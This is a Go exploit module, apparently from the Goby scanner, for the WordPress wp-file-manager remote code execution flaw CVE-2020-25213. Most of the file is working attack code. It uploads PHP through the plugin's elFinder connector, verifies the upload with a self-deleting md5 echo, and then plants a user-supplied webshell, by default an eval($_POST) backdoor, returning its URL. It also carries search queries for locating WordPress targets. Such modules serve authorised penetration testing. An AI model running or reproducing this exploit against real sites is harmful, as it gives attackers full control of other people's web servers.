package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin Wp-File-Manager RCE (CVE-2020-25213)",
    "Description": "The File Manager (wp-file-manager) plugin before 6.9 for WordPress allows remote attackers to upload and execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory. This was exploited in the wild in August and September 2020.",
    "Impact": "WordPress Plugin Wp-File-Manager RCE (CVE-2020-25213)",
    "Recommendation": "<p>The vendor has released a bug fix, please stay tuned for updates: <a href=\"https://wordpress.org/plugins/wp-file-manager/\">https://wordpress.org/plugins /wp-file-manager/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access. 2. If it is not necessary, it is forbidden to access the system from the public network. </p>",
    "Product": "Wordpress Plugin Wp-FileManager",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "WordPress Wp-File-Manager 插件 命令执行漏洞(CVE-2020-25213)",
            "Description": "<p>WordPress 是一款开源软件，可用于创建精美的网站、博客或应用程序。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/wp-file-manager/\">https://wordpress.org/plugins/wp-file-manager/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "Wordpress Plugin Wp-FileManager",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin Wp-File-Manager RCE (CVE-2020-25213)",
            "Description": "The File Manager (wp-file-manager) plugin before 6.9 for WordPress allows remote attackers to upload and execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory. This was exploited in the wild in August and September 2020.",
            "Impact": "WordPress Plugin Wp-File-Manager RCE (CVE-2020-25213)",
            "Recommendation": "<p>The vendor has released a bug fix, please stay tuned for updates: <a href=\"https://wordpress.org/plugins/wp-file-manager/\">https://wordpress.org/plugins /wp-file-manager/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access. <br>2. If it is not necessary, it is forbidden to access the system from the public network. </p>",
            "Product": "Wordpress Plugin Wp-FileManager",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "((body=\"name=\\\"generator\\\" content=\\\"WordPress \" || body=\"name=\\\"generator\\\" content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) ) || header=\"wordpress_test_cookie\" || banner=\"wordpress_test_cookie\" || header=\"X-Redirect-By: WordPress\" || banner=\"X-Redirect-By: WordPress\" || (body=\"<div class=\\\"wp-die-message\\\">\" && (title=\"WordPress \" || body=\"#error-page .wp-die-message\")) || (body=\"/wp-content/themes/\" && body=\"/wp-includes/js/jquery/\" && (body=\"id='wp-block-library-css\" || body=\"WordPress\" || body=\"wppaDebug\")) || header=\"Cf-Edge-Cache: cache,platform=wordpress\" || header=\"X-Nginx-Cache: WordPress\") || body=\"wp-content/plugins/wp-file-manager\"",
    "GobyQuery": "((body=\"name=\\\"generator\\\" content=\\\"WordPress \" || body=\"name=\\\"generator\\\" content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) ) || header=\"wordpress_test_cookie\" || banner=\"wordpress_test_cookie\" || header=\"X-Redirect-By: WordPress\" || banner=\"X-Redirect-By: WordPress\" || (body=\"<div class=\\\"wp-die-message\\\">\" && (title=\"WordPress \" || body=\"#error-page .wp-die-message\")) || (body=\"/wp-content/themes/\" && body=\"/wp-includes/js/jquery/\" && (body=\"id='wp-block-library-css\" || body=\"WordPress\" || body=\"wppaDebug\")) || header=\"Cf-Edge-Cache: cache,platform=wordpress\" || header=\"X-Nginx-Cache: WordPress\") || body=\"wp-content/plugins/wp-file-manager\"",
    "Author": "mengzd@foxmail.com",
    "Homepage": "https://wordpress.org/plugins/wp-file-manager/",
    "DisclosureDate": "2021-05-28",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2020-25213"
    ],
    "CNVD": [
        "CNVD-2020-52342"
    ],
    "CNNVD": [
        "CNNVD-202009-602"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Webshell",
            "type": "input",
            "value": "<?php eval($_POST['ant']); ?>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "{\"error\":[\"errUnknownCmd\"]}") {
					rand.Seed(time.Now().UnixNano())
					var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
					s := make([]rune, 10)
					for i := range s {
						s[i] = letters[rand.Intn(len(letters))]
					}
					randomFileName := string(s)
					echoNumber := rand.Intn(100)
					hasher := md5.New()
					hasher.Write([]byte(strconv.Itoa(echoNumber)))
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------66e3ca93281c7041")
					cfg.Data = fmt.Sprintf("--------------------------66e3ca93281c7041\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n"+
						"--------------------------66e3ca93281c7041\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n"+
						"--------------------------66e3ca93281c7041\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"%s.php\"\r\n"+
						"Content-Type: image/png\r\n\r\n<?php echo md5(%d);unlink(__FILE__);?>\r\n--------------------------66e3ca93281c7041--", randomFileName, echoNumber)
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randomFileName) &&
							strings.Contains(resp.Header["Content-Type"][0], "application/json") {
							jsonMap := make(map[string][]map[string]interface{})
							json.Unmarshal([]byte(resp.Utf8Html), &jsonMap)
							webshellUri := jsonMap["added"][0]["url"]
							cfg = httpclient.NewGetRequestConfig(webshellUri.(string))
							cfg.VerifyTls = false
							cfg.FollowRedirect = false
							if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
								if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, hex.EncodeToString(hasher.Sum(nil))) {
									return true
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			webshell := ss.Params["Webshell"].(string)
			rand.Seed(time.Now().UnixNano())
			var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
			s := make([]rune, 10)
			for i := range s {
				s[i] = letters[rand.Intn(len(letters))]
			}
			randomFileName := string(s)
			uri := "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------66e3ca93281c7041")
			cfg.Data = fmt.Sprintf("--------------------------66e3ca93281c7041\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n"+
				"--------------------------66e3ca93281c7041\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n"+
				"--------------------------66e3ca93281c7041\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"%s.php\"\r\n"+
				"Content-Type: image/png\r\n\r\n%s\r\n--------------------------66e3ca93281c7041--", randomFileName, webshell)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randomFileName) &&
					strings.Contains(resp.Header["Content-Type"][0], "application/json") {
					jsonMap := make(map[string][]map[string]interface{})
					json.Unmarshal([]byte(resp.Utf8Html), &jsonMap)
					webshellUri := jsonMap["added"][0]["url"]
					expResult.Output = fmt.Sprintf("Webshell:%s%s", expResult.HostInfo, webshellUri.(string))
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
